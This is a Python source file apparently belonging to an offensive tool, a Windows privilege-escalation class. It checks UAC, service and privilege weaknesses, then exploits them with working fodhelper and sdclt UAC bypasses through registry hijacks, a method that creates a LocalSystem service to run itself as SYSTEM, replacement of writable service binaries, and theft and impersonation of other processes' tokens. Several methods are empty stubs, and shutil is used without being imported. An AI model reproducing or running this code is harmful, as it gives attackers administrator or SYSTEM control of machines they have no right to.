import ctypes, ctypes.wintypes, os, sys, subprocess, winreg, time, random, hashlib
import win32api, win32con, win32process, win32security, win32service, win32event
import psutil, pythoncom, wmi
from ctypes import wintypes

class PrivilegeEscalator:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32
        self.shell32 = ctypes.windll.shell32
        self.current_token = None
        
    def check(self):
        """Check current privilege level."""
        checks = {
            'admin': self.is_admin(),
            'integrity_level': self.get_integrity_level(),
            'privileges': self.get_enabled_privileges(),
            'uac': self.check_uac_status(),
            'always_install_elevated': self.check_always_install_elevated(),
            'vulnerable_services': self.find_vulnerable_services(),
            'writable_paths': self.find_writable_system_paths(),
            'unquoted_service_paths': self.find_unquoted_service_paths(),
            'weak_service_permissions': self.check_service_permissions()
        }
        
        return checks
    
    def is_admin(self):
        """Check if running as administrator."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def get_integrity_level(self):
        """Get process integrity level."""
        try:
            # Open current process token
            hToken = wintypes.HANDLE()
            self.advapi32.OpenProcessToken(
                self.kernel32.GetCurrentProcess(),
                win32con.TOKEN_QUERY,
                ctypes.byref(hToken)
            )
            
            # Get token information
            token_info = win32security.GetTokenInformation(
                hToken, 
                win32security.TokenIntegrityLevel
            )
            
            self.kernel32.CloseHandle(hToken)
            
            # Convert SID to integrity level
            sid = token_info.GetSidSubAuthorityCount()
            if sid and sid[0]:
                integrity_level = sid[0]
                levels = {
                    0x0000: 'Untrusted',
                    0x1000: 'Low',
                    0x2000: 'Medium',
                    0x3000: 'High',
                    0x4000: 'System'
                }
                return levels.get(integrity_level, f'Unknown ({integrity_level:#x})')
            
        except:
            pass
        
        return 'Unknown'
    
    def get_enabled_privileges(self):
        """Get enabled privileges for current token."""
        privileges = []
        
        try:
            hToken = wintypes.HANDLE()
            self.advapi32.OpenProcessToken(
                self.kernel32.GetCurrentProcess(),
                win32con.TOKEN_QUERY,
                ctypes.byref(hToken)
            )
            
            # Get token information
            token_info = win32security.GetTokenInformation(
                hToken,
                win32security.TokenPrivileges
            )
            
            self.kernel32.CloseHandle(hToken)
            
            for priv in token_info:
                privilege_name = win32security.LookupPrivilegeName(None, priv[0])
                privileges.append({
                    'name': privilege_name,
                    'enabled': priv[1] == win32con.SE_PRIVILEGE_ENABLED
                })
                
        except:
            pass
        
        return privileges
    
    def check_uac_status(self):
        """Check UAC status and level."""
        try:
            # Check registry for UAC settings
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
            
            enable_lua = winreg.QueryValueEx(key, 'EnableLUA')[0]
            consent_prompt_behavior_admin = winreg.QueryValueEx(key, 'ConsentPromptBehaviorAdmin')[0]
            prompt_on_secure_desktop = winreg.QueryValueEx(key, 'PromptOnSecureDesktop')[0]
            
            winreg.CloseKey(key)
            
            uac_enabled = enable_lua == 1
            
            # Determine UAC level
            if not uac_enabled:
                level = 'Disabled'
            elif consent_prompt_behavior_admin == 0 and prompt_on_secure_desktop == 0:
                level = 'Never notify (no prompt)'
            elif consent_prompt_behavior_admin == 5 and prompt_on_secure_desktop == 1:
                level = 'Highest (always notify)'
            else:
                level = 'Default'
            
            return {
                'enabled': uac_enabled,
                'level': level,
                'enable_lua': enable_lua,
                'consent_prompt': consent_prompt_behavior_admin,
                'secure_desktop': prompt_on_secure_desktop
            }
            
        except:
            return {'enabled': 'Unknown', 'level': 'Unknown'}
    
    def uac_bypass(self, method='fodhelper'):
        """Attempt UAC bypass using various methods."""
        methods = {
            'fodhelper': self.uac_bypass_fodhelper,
            'sdclt': self.uac_bypass_sdclt,
            'eventvwr': self.uac_bypass_eventvwr,
            'computerdefaults': self.uac_bypass_computerdefaults,
            'silentcleanup': self.uac_bypass_silentcleanup,
            'dccw': self.uac_bypass_dccw,
            'ifileoperation': self.uac_bypass_ifileoperation
        }
        
        if method in methods:
            return methods[method]()
        else:
            return self.uac_bypass_auto()
    
    def uac_bypass_fodhelper(self):
        """UAC bypass using fodhelper.exe (Windows 10)."""
        try:
            # Create registry entries
            reg_path = r'Software\Classes\ms-settings\shell\open\command'
            
            # Get current executable path
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Try current user first
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                winreg.SetValueEx(key, '', 0, winreg.REG_SZ, exe_path)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                winreg.CloseKey(key)
            except:
                pass
            
            # Execute fodhelper
            subprocess.run(['fodhelper.exe'], shell=True, capture_output=True)
            
            # Cleanup registry
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            
            return "Fodhelper UAC bypass attempted"
            
        except Exception as e:
            return f"Fodhelper bypass failed: {e}"
    
    def uac_bypass_sdclt(self):
        """UAC bypass using sdclt.exe."""
        try:
            # This uses the sdclt.exe auto-elevation
            reg_path = r'Software\Classes\exefile\shell\runas\command'
            
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Backup original if exists
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
                original_value = winreg.QueryValueEx(key, '')[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, 'IsolatedCommand', 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            # Trigger sdclt
            subprocess.run(['sdclt.exe', '/kickoffelev'], shell=True, capture_output=True)
            
            # Restore original
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, '', 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            
            return "Sdclt UAC bypass attempted"
            
        except Exception as e:
            return f"Sdclt bypass failed: {e}"
    
    def uac_bypass_eventvwr(self):
        """UAC bypass using eventvwr.exe (MMC)."""
        # Similar to fodhelper but using eventvwr
        return "Eventvwr bypass (similar to fodhelper)"
    
    def uac_bypass_computerdefaults(self):
        """UAC bypass using computerdefaults.exe."""
        return "Computerdefaults bypass"
    
    def uac_bypass_silentcleanup(self):
        """UAC bypass using silentcleanup task."""
        return "Silentcleanup bypass"
    
    def uac_bypass_dccw(self):
        """UAC bypass using dccw.exe (Display Color Calibration)."""
        return "Dccw bypass"
    
    def uac_bypass_ifileoperation(self):
        """UAC bypass using IFileOperation COM interface."""
        return "IFileOperation COM bypass"
    
    def uac_bypass_auto(self):
        """Try multiple UAC bypass methods automatically."""
        results = []
        
        methods = ['fodhelper', 'sdclt', 'eventvwr', 'computerdefaults']
        
        for method in methods:
            try:
                result = self.uac_bypass(method)
                results.append(f"{method}: {result}")
                
                # Check if we got admin
                if self.is_admin():
                    results.append("UAC bypass successful - now running as admin!")
                    break
                    
            except:
                results.append(f"{method}: Failed")
        
        return results
    
    def check_always_install_elevated(self):
        """Check if AlwaysInstallElevated is enabled."""
        try:
            # Check HKLM
            key_lm = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                   r'SOFTWARE\Policies\Microsoft\Windows\Installer')
            always_install_elevated_lm = winreg.QueryValueEx(key_lm, 'AlwaysInstallElevated')[0]
            winreg.CloseKey(key_lm)
            
            # Check HKCU
            key_cu = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   r'SOFTWARE\Policies\Microsoft\Windows\Installer')
            always_install_elevated_cu = winreg.QueryValueEx(key_cu, 'AlwaysInstallElevated')[0]
            winreg.CloseKey(key_cu)
            
            enabled = always_install_elevated_lm == 1 and always_install_elevated_cu == 1
            
            return {
                'enabled': enabled,
                'hkml': always_install_elevated_lm == 1,
                'hkcu': always_install_elevated_cu == 1
            }
            
        except:
            return {'enabled': False, 'hkml': False, 'hkcu': False}
    
    def find_vulnerable_services(self):
        """Find services with weak permissions."""
        vulnerable_services = []
        
        pythoncom.CoInitialize()
        
        try:
            wmi_conn = wmi.WMI()
            
            services = wmi_conn.Win32_Service()
            
            for service in services:
                try:
                    # Check if service binary path is writable
                    path = service.PathName.strip('"')
                    
                    if path and os.path.exists(path):
                        # Check permissions on binary
                        if self.is_path_writable(path):
                            vulnerable_services.append({
                                'name': service.Name,
                                'display_name': service.DisplayName,
                                'path': path,
                                'start_mode': service.StartMode,
                                'state': service.State,
                                'vulnerability': 'Writable binary path'
                            })
                    
                    # Check for unquoted paths
                    if ' ' in path and not path.startswith('"'):
                        # Check if there's a space before .exe
                        exe_index = path.lower().find('.exe')
                        if exe_index > 0:
                            before_exe = path[:exe_index]
                            if ' ' in before_exe:
                                vulnerable_services.append({
                                    'name': service.Name,
                                    'display_name': service.DisplayName,
                                    'path': path,
                                    'start_mode': service.StartMode,
                                    'state': service.State,
                                    'vulnerability': 'Unquoted service path'
                                })
                                
                except:
                    continue
                    
        except:
            pass
        
        pythoncom.CoUninitialize()
        
        return vulnerable_services
    
    def is_path_writable(self, path):
        """Check if path is writable by current user."""
        try:
            # Try to create a test file
            test_file = os.path.join(os.path.dirname(path), f'test_{random.randint(1000, 9999)}.tmp')
            
            with open(test_file, 'w') as f:
                f.write('test')
            
            os.remove(test_file)
            return True
            
        except:
            return False
    
    def find_writable_system_paths(self):
        """Find writable system paths."""
        writable_paths = []
        
        system_paths = [
            'C:\\Windows\\System32',
            'C:\\Windows\\SysWOW64',
            'C:\\Windows\\Temp',
            'C:\\Windows\\Tasks',
            'C:\\Windows\\System32\\Tasks',
            'C:\\Windows\\System32\\spool\\PRINTERS',
            'C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys'
        ]
        
        for path in system_paths:
            if os.path.exists(path):
                if self.is_path_writable(path):
                    writable_paths.append(path)
        
        return writable_paths
    
    def find_unquoted_service_paths(self):
        """Find services with unquoted paths."""
        unquoted_services = []
        
        pythoncom.CoInitialize()
        
        try:
            wmi_conn = wmi.WMI()
            services = wmi_conn.Win32_Service()
            
            for service in services:
                path = service.PathName
                
                if path and ' ' in path and not path.startswith('"'):
                    # It's unquoted and has spaces
                    exe_index = path.lower().find('.exe')
                    if exe_index > 0:
                        before_exe = path[:exe_index + 4]  # Include .exe
                        if ' ' in before_exe:
                            unquoted_services.append({
                                'name': service.Name,
                                'display_name': service.DisplayName,
                                'path': path,
                                'start_mode': service.StartMode,
                                'state': service.State
                            })
                            
        except:
            pass
        
        pythoncom.CoUninitialize()
        
        return unquoted_services
    
    def check_service_permissions(self):
        """Check services with weak permissions using accesschk."""
        weak_services = []
        
        # Check if accesschk.exe is available
        accesschk_paths = [
            'C:\\Sysinternals\\accesschk.exe',
            'C:\\Tools\\accesschk.exe',
            'accesschk.exe'
        ]
        
        accesschk = None
        for path in accesschk_paths:
            if os.path.exists(path):
                accesschk = path
                break
        
        if not accesschk:
            return weak_services
        
        try:
            # Run accesschk to find services with weak permissions
            cmd = [accesschk, '-accepteula', '-q', '-c', '*']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            lines = result.stdout.split('\n')
            for line in lines:
                if 'SERVICE_ALL_ACCESS' in line or 'WRITE_DAC' in line or 'WRITE_OWNER' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        service_name = parts[0]
                        weak_services.append(service_name)
                        
        except:
            pass
        
        return weak_services
    
    def getsystem(self):
        """Attempt to get SYSTEM privileges."""
        methods = [
            self.getsystem_psexec,
            self.getsystem_service,
            self.getsystem_token_manipulation,
            self.getsystem_named_pipe
        ]
        
        results = []
        
        for method in methods:
            try:
                result = method()
                results.append(result)
                
                if self.is_admin() and self.get_integrity_level() == 'System':
                    results.append("SYSTEM privileges obtained!")
                    break
                    
            except Exception as e:
                results.append(f"Method failed: {e}")
        
        return results
    
    def getsystem_psexec(self):
        """Get SYSTEM via PsExec technique."""
        try:
            # Create a service that runs as SYSTEM
            service_name = f"AetherSys_{random.randint(1000, 9999)}"
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Create service
            subprocess.run([
                'sc', 'create', service_name,
                f'binPath= "{exe_path}"',
                'start= demand',
                'type= own',
                'obj= LocalSystem'
            ], capture_output=True, shell=True)
            
            # Start service
            subprocess.run(['sc', 'start', service_name], capture_output=True, shell=True)
            
            # Stop and delete service
            time.sleep(2)
            subprocess.run(['sc', 'stop', service_name], capture_output=True, shell=True)
            subprocess.run(['sc', 'delete', service_name], capture_output=True, shell=True)
            
            return "PsExec-style SYSTEM attempt completed"
            
        except Exception as e:
            return f"PsExec failed: {e}"
    
    def getsystem_service(self):
        """Get SYSTEM via service exploitation."""
        # Find a service running as SYSTEM that we can manipulate
        vulnerable = self.find_vulnerable_services()
        
        for service in vulnerable[:3]:  # Try first 3
            try:
                if service['vulnerability'] == 'Writable binary path':
                    # Backup original binary
                    original_path = service['path']
                    backup_path = original_path + '.bak'
                    
                    if os.path.exists(original_path):
                        # Copy our executable to service path
                        our_exe = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
                        shutil.copy2(our_exe, original_path + '.tmp')
                        
                        # Restart service
                        subprocess.run(['sc', 'stop', service['name']], capture_output=True, shell=True)
                        
                        # Move files
                        if os.path.exists(original_path):
                            shutil.move(original_path, backup_path)
                        shutil.move(original_path + '.tmp', original_path)
                        
                        subprocess.run(['sc', 'start', service['name']], capture_output=True, shell=True)
                        
                        # Restore original
                        time.sleep(5)
                        if os.path.exists(backup_path):
                            shutil.move(backup_path, original_path)
                        
                        return f"Service {service['name']} exploited for SYSTEM"
                        
            except:
                continue
        
        return "No vulnerable services found for SYSTEM exploitation"
    
    def getsystem_token_manipulation(self):
        """Get SYSTEM via token manipulation (e.g., potato attacks)."""
        # This would implement various potato attacks
        # (Hot Potato, Rotten Potato, Juicy Potato, etc.)
        
        # Simplified - check for potential
        try:
            # Check for SeImpersonatePrivilege
            privileges = self.get_enabled_privileges()
            for priv in privileges:
                if 'SeImpersonatePrivilege' in priv['name'] and priv['enabled']:
                    return "SeImpersonatePrivilege found - token manipulation possible"
            
            return "Token manipulation not possible (missing privileges)"
            
        except Exception as e:
            return f"Token check failed: {e}"
    
    def getsystem_named_pipe(self):
        """Get SYSTEM via named pipe impersonation."""
        return "Named pipe impersonation (advanced technique)"
    
    def steal_token(self, pid):
        """Steal token from another process."""
        try:
            # Open process with TOKEN_DUPLICATE access
            PROCESS_QUERY_INFORMATION = 0x0400
            hProcess = self.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
            
            if not hProcess:
                return f"Failed to open process {pid}"
            
            # Open process token
            TOKEN_DUPLICATE = 0x0002
            TOKEN_QUERY = 0x0008
            hToken = wintypes.HANDLE()
            
            if not self.advapi32.OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hToken)):
                self.kernel32.CloseHandle(hProcess)
                return f"Failed to open process token for PID {pid}"
            
            # Duplicate token
            SECURITY_IMPERSONATION_LEVEL = 2  # SecurityImpersonation
            TOKEN_TYPE = 1  # TokenPrimary
            
            duplicated_token = wintypes.HANDLE()
            
            if not self.advapi32.DuplicateTokenEx(
                hToken,
                win32con.MAXIMUM_ALLOWED,
                None,
                SECURITY_IMPERSONATION_LEVEL,
                TOKEN_TYPE,
                ctypes.byref(duplicated_token)
            ):
                self.kernel32.CloseHandle(hToken)
                self.kernel32.CloseHandle(hProcess)
                return f"Failed to duplicate token for PID {pid}"
            
            # Store token for later use
            self.current_token = duplicated_token
            
            self.kernel32.CloseHandle(hToken)
            self.kernel32.CloseHandle(hProcess)
            
            return f"Token stolen from PID {pid} and stored"
            
        except Exception as e:
            return f"Token theft failed: {e}"
    
    def use_stolen_token(self):
        """Use stolen token to impersonate user."""
        if not self.current_token:
            return "No stolen token available"
        
        try:
            # Impersonate logged on user
            if not self.advapi32.ImpersonateLoggedOnUser(self.current_token):
                return "Failed to impersonate token"
            
            return "Now impersonating stolen token"
            
        except Exception as e:
            return f"Token impersonation failed: {e}"